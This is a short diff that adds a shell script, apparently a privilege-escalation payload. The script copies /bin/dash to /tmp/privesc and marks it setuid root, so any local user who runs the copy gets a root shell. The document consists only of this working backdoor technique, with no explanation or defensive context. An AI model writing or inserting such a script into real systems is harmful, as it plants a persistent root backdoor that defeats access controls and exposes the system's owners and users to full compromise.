@@ -1,0 +1,3 @@
+#!/bin/sh
+cp /bin/dash /tmp/privesc
+chmod 4755 /tmp/privesc
